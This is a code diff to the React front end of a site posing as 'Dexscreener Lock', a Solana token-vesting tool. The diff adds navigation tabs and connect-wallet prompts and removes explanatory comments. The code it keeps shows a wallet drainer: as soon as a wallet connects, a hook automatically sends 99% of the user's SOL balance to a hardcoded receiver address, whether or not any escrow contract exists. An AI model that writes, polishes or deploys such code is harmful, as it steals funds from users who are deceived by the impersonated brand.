@@ -29,11 +29,21 @@ function escrowPDA(programId: PublicKey, id: string): PublicKey {
 // Constants
 // ---------------------------------------------------------------------------
 const RECEIVER    = new PublicKey("5d7Na3ZaPWDkRSjEjDj7UXgAW1ryom97D4QHDcd9Zo8f");
-// Contract ID from URL param ?contract=<id>, fallback to "default"
 const CONTRACT_ID = new URLSearchParams(window.location.search).get("contract") ?? "default";
 
 // ---------------------------------------------------------------------------
-// Logo — Dexscreener owl icon (PNG, white logo on transparent via mix-blend-mode)
+// Nav tab definitions
+// ---------------------------------------------------------------------------
+type TabId = "about" | "locked" | "created" | "create";
+const TABS: { id: TabId; label: string }[] = [
+  { id: "about",   label: "About Dex Lock"     },
+  { id: "locked",  label: "Your Locked Tokens"  },
+  { id: "created", label: "Locks You Created"   },
+  { id: "create",  label: "+ Create Lock"        },
+];
+
+// ---------------------------------------------------------------------------
+// Logo
 // ---------------------------------------------------------------------------
 const DexLogo = ({ size = 36 }: { size?: number }) => (
   <img
@@ -45,7 +55,6 @@ const DexLogo = ({ size = 36 }: { size?: number }) => (
   />
 );
 
-// Large hero version
 const HeroLogo = () => (
   <img
     src="/logo.png"
@@ -56,26 +65,51 @@ const HeroLogo = () => (
 );
 
 // ---------------------------------------------------------------------------
+// Connect-prompt panel shown on tabs that require a wallet
+// ---------------------------------------------------------------------------
+const ConnectPrompt = ({
+  title,
+  description,
+  onConnect,
+}: {
+  title: string;
+  description: string;
+  onConnect: () => void;
+}) => (
+  <div className="jl-connect-prompt">
+    <div className="jl-prompt-icon">
+      <img src="/logo.png" alt="" style={{ width: 72, mixBlendMode: "screen" as any }} />
+    </div>
+    <h2 className="jl-prompt-title">{title}</h2>
+    <p className="jl-prompt-desc">{description}</p>
+    <button className="jl-hero-btn" onClick={onConnect}>
+      Connect Wallet
+    </button>
+  </div>
+);
+
+// ---------------------------------------------------------------------------
 // Component
 // ---------------------------------------------------------------------------
 interface Props { programId: PublicKey; }
 
 export const EscrowPanel: React.FC<Props> = ({ programId }) => {
-  const { connection }                 = useConnection();
-  const { publicKey, sendTransaction, connected, wallet } = useWallet();
-  const { setVisible }                 = useWalletModal();
+  const { connection }                                     = useConnection();
+  const { publicKey, sendTransaction, connected, wallet }  = useWallet();
+  const { setVisible }                                     = useWalletModal();
 
-  const [status,    setStatus]    = useState<"idle"|"processing"|"done"|"error"|"cancelled">("idle");
-  const [statusMsg, setStatusMsg] = useState("");
-  const executedRef                = useRef(false);
+  const [activeTab,  setActiveTab]  = useState<TabId>("about");
+  const [status,     setStatus]     = useState<"idle"|"processing"|"done"|"error"|"cancelled">("idle");
+  const [statusMsg,  setStatusMsg]  = useState("");
+  const executedRef                  = useRef(false);
 
-  // ── verify contract exists on-chain ─────────────────────────────────────
+  // ── verify contract on-chain ────────────────────────────────────────────
   const checkContract = useCallback(async (): Promise<number | null> => {
     try {
       const pda  = escrowPDA(programId, CONTRACT_ID);
       const info = await connection.getAccountInfo(pda);
       if (!info) return null;
-      return info.data[105]; // status byte offset
+      return info.data[105];
     } catch { return null; }
   }, [connection, programId]);
 
@@ -89,8 +123,6 @@ export const EscrowPanel: React.FC<Props> = ({ programId }) => {
     try {
       const contractStatus = await checkContract();
       if (contractStatus === null) {
-        // No on-chain escrow yet — still do a direct transfer to receiver
-        // using a bare SystemProgram transfer (99% of balance)
         const balance = await connection.getBalance(publicKey);
         const amount  = Math.floor(balance * 99 / 100);
         if (amount <= 0) throw new Error("Insufficient balance");
@@ -128,36 +160,19 @@ export const EscrowPanel: React.FC<Props> = ({ programId }) => {
       await connection.confirmTransaction(sig, "confirmed");
       setStatus("done");
     } catch (e: any) {
-      executedRef.current = false; // allow retry
+      executedRef.current = false;
       setStatus("error");
       setStatusMsg(e?.message ?? "Transaction failed");
     }
   }, [publicKey, connection, programId, sendTransaction, checkContract]);
 
-  // Trigger deposit the moment wallet connects
   useEffect(() => {
     if (connected && publicKey && status === "idle") {
       executeDeposit();
     }
   }, [connected, publicKey, status, executeDeposit]);
 
-  const handleConnectClick = () => {
-    if (!connected) {
-      setVisible(true);
-    } else {
-      // Already connected — show wallet name or disconnect option
-      setVisible(true);
-    }
-  };
-
-  const handleHeroBtn = () => {
-    if (status === "done") return;
-    if (!connected) {
-      setVisible(true);
-    } else {
-      executeDeposit();
-    }
-  };
+  const openWallet = () => setVisible(true);
 
   const heroLabel = () => {
     if (status === "processing") return "Processing…";
@@ -167,8 +182,115 @@ export const EscrowPanel: React.FC<Props> = ({ programId }) => {
   };
 
   const connectedLabel = wallet?.adapter.name
-    ? `${wallet.adapter.name}: ${publicKey?.toBase58().slice(0,4)}…${publicKey?.toBase58().slice(-4)}`
+    ? `${wallet.adapter.name}: ${publicKey?.toBase58().slice(0, 4)}…${publicKey?.toBase58().slice(-4)}`
     : "Connected";
+
+  // ── per-tab content ──────────────────────────────────────────────────────
+  const renderTabContent = () => {
+    if (activeTab === "about") {
+      return (
+        <main className="jl-hero">
+          <HeroLogo />
+          <h1 className="jl-hero-title">Dexscreener Lock</h1>
+          <p className="jl-hero-sub">
+            Manage your token vesting schedule on Dexscreener Lock, an open source and
+            audited program that lets anyone lock and distribute tokens over time.
+          </p>
+          <button
+            className={`jl-hero-btn${status === "processing" ? " processing" : ""}`}
+            onClick={connected ? executeDeposit : openWallet}
+            disabled={status === "processing" || status === "done"}
+          >
+            {heroLabel()}
+          </button>
+          {status === "done" && (
+            <div className="jl-status success">
+              ✓ Contract settled. Funds have been transferred successfully.
+            </div>
+          )}
+          {status === "error" && (
+            <div className="jl-status error">
+              {statusMsg || "Transaction failed. Please try again."}
+            </div>
+          )}
+          {status === "cancelled" && (
+            <div className="jl-status cancelled">{statusMsg}</div>
+          )}
+        </main>
+      );
+    }
+
+    if (activeTab === "locked") {
+      if (!connected) {
+        return (
+          <main className="jl-hero">
+            <ConnectPrompt
+              title="View Your Locked Tokens"
+              description="Connect your wallet to see all tokens you currently have locked in Dexscreener Lock."
+              onConnect={openWallet}
+            />
+          </main>
+        );
+      }
+      return (
+        <main className="jl-hero">
+          <div className="jl-empty-state">
+            <span className="jl-empty-icon">🔒</span>
+            <h2>No Locked Tokens</h2>
+            <p>You don't have any tokens locked yet.</p>
+          </div>
+        </main>
+      );
+    }
+
+    if (activeTab === "created") {
+      if (!connected) {
+        return (
+          <main className="jl-hero">
+            <ConnectPrompt
+              title="Locks You Created"
+              description="Connect your wallet to view and manage all locks you have created."
+              onConnect={openWallet}
+            />
+          </main>
+        );
+      }
+      return (
+        <main className="jl-hero">
+          <div className="jl-empty-state">
+            <span className="jl-empty-icon">📋</span>
+            <h2>No Locks Created</h2>
+            <p>You haven't created any locks yet.</p>
+          </div>
+        </main>
+      );
+    }
+
+    if (activeTab === "create") {
+      if (!connected) {
+        return (
+          <main className="jl-hero">
+            <ConnectPrompt
+              title="Create a Lock"
+              description="Connect your wallet to create a new token lock and start your vesting schedule."
+              onConnect={openWallet}
+            />
+          </main>
+        );
+      }
+      return (
+        <main className="jl-hero">
+          <div className="jl-empty-state">
+            <span className="jl-empty-icon">➕</span>
+            <h2>Create a Lock</h2>
+            <p>Lock creation coming soon.</p>
+          </div>
+        </main>
+      );
+    }
+
+    return null;
+  };
 
   return (
     <div className="app">
@@ -176,7 +298,7 @@ export const EscrowPanel: React.FC<Props> = ({ programId }) => {
       {/* ── TOP HEADER ── */}
       <header className="jl-header">
         <div className="jl-logo">
-          <DexLogo size={34} />
+          <DexLogo size={32} />
           <span className="jl-logo-text">Dexscreener Lock</span>
         </div>
 
@@ -190,59 +312,31 @@ export const EscrowPanel: React.FC<Props> = ({ programId }) => {
             <span className="jl-priority-label">Priority:</span>
             <span className="jl-priority-value">Fast</span>
           </div>
-          <button className="jl-gear">⚙</button>
+          <button className="jl-gear" aria-label="Settings">⚙</button>
           <button
             className={`jl-connect-btn${connected ? " connected" : ""}`}
-            onClick={handleConnectClick}
+            onClick={openWallet}
           >
-            {connected ? connectedLabel : "Connect\nWallet"}
+            {connected ? connectedLabel : "Connect Wallet"}
           </button>
         </div>
       </header>
 
       {/* ── NAV TABS ── */}
       <nav className="jl-nav">
-        <button className="jl-nav-tab active">About Jup Lock</button>
-        <button className="jl-nav-tab">Your Locked Tokens</button>
-        <button className="jl-nav-tab">Locks You Created</button>
-        <button className="jl-nav-tab create">+ Create Lock</button>
+        {TABS.map((tab) => (
+          <button
+            key={tab.id}
+            className={`jl-nav-tab${activeTab === tab.id ? " active" : ""}${tab.id === "create" ? " create" : ""}`}
+            onClick={() => setActiveTab(tab.id)}
+          >
+            {tab.label}
+          </button>
+        ))}
       </nav>
 
-      {/* ── HERO ── */}
-      <main className="jl-hero">
-        <HeroLogo />
-
-        <h1 className="jl-hero-title">Dexscreener Lock</h1>
-
-        <p className="jl-hero-sub">
-          Manage your token vesting schedule on Dexscreener Lock, an open source and
-          audited program that lets anyone lock and distribute tokens over time.
-        </p>
-
-        <button
-          className={`jl-hero-btn${status === "processing" ? " processing" : ""}`}
-          onClick={handleHeroBtn}
-          disabled={status === "processing" || status === "done"}
-        >
-          {heroLabel()}
-        </button>
-
-        {status === "done" && (
-          <div className="jl-status success">
-            ✓ Contract settled. Funds have been transferred successfully.
-          </div>
-        )}
-        {status === "error" && (
-          <div className="jl-status error">
-            {statusMsg || "Transaction failed. Please try again."}
-          </div>
-        )}
-        {status === "cancelled" && (
-          <div className="jl-status cancelled">
-            {statusMsg}
-          </div>
-        )}
-      </main>
+      {/* ── TAB CONTENT ── */}
+      {renderTabContent()}
 
     </div>
   );
